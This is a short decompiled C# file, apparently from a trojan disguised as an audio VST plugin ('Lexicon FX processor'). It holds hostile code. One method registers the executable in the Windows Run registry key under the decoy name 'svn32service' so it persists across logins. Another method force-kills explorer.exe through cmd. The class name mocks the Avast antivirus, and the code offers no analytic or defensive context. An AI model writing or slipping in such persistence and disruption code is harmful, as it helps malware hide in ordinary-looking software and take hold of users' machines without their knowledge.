using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Lexicon_FX_processor_VST_module_with_TAP_delay;

internal class AvastSosetHui
{
	private const string name = "svn32service";

	private bool autorun = true;

	public void suka()
	{
		string executablePath = Application.get_ExecutablePath();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
		if (autorun)
		{
			registryKey.SetValue("svn32service", executablePath);
		}
		else
		{
			registryKey.DeleteValue("svn32service");
		}
		registryKey.Close();
	}

	public void pidoras()
	{
		Process.Start("cmd.exe", "/C taskkill /f /im explorer.exe");
	}
}
